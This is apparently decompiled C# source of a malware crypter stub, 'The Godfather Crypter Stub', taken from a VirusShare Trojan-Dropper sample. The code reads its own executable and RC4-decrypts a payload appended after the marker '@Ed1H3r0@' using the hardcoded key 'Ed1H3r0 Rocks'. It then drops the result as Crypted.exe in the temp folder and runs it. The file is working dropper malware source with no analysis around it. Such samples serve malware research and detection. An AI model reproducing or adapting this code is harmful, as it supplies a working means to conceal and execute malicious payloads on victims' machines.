// Decompiled with JetBrains decompiler
// Type: The_Godfather_Stub.Form1
// Assembly: The Godfather Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B6D7DC7D-D143-4E2E-8536-D45E1BC04DE9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.MSIL.Mudrop.dv-e69f2a25a6bca3c426de0dd1947ff5bc47dca99e1ce5139532b7716a295f4669.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace The_Godfather_Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    private const string filesplit = "@Ed1H3r0@";

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      lock (Form1.__ENCList)
        Form1.__ENCList.Add(new WeakReference((object) this));
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.Label1 = new Label();
      this.SuspendLayout();
      this.Label1.AutoSize = true;
      this.Label1.Location = new Point(12, 14);
      this.Label1.Name = "Label1";
      Label label1 = this.Label1;
      Size size1 = new Size(167, 13);
      Size size2 = size1;
      label1.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Contact Me: Edi.H3r0@gmail.com";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(182, 36);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label1);
      this.Name = nameof (Form1);
      this.Text = "The Godfather Crypter Stub By Ed1H3r0";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label1_Click);
        if (this._Label1 != null)
          this._Label1.Click -= eventHandler;
        this._Label1 = value;
        if (this._Label1 == null)
          return;
        this._Label1.Click += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        string tempPath = Path.GetTempPath();
label_3:
        num3 = 3;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_4:
        num3 = 4;
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_5:
        num3 = 5;
        FileSystem.FileGet(1, ref Expression);
label_6:
        num3 = 6;
        FileSystem.FileClose(1);
label_7:
        num3 = 7;
        string[] strArray = Strings.Split(Expression, "@Ed1H3r0@");
label_8:
        num3 = 8;
        string str = Form1.rc4(strArray[1], "Ed1H3r0 Rocks");
label_9:
        num3 = 9;
        FileSystem.FileOpen(5, tempPath + "\\Crypted.exe", OpenMode.Binary, OpenAccess.ReadWrite);
label_10:
        num3 = 10;
        FileSystem.FilePut(5, str, -1L, false);
label_11:
        num3 = 11;
        FileSystem.FileClose(5);
label_12:
        num3 = 12;
        Process.Start(tempPath + "\\Crypted.exe");
label_13:
        num3 = 13;
        this.Close();
        ProjectData.EndApp();
        goto label_20;
label_15:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static string rc4(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    private void Label1_Click(object sender, EventArgs e)
    {
    }
  }
}
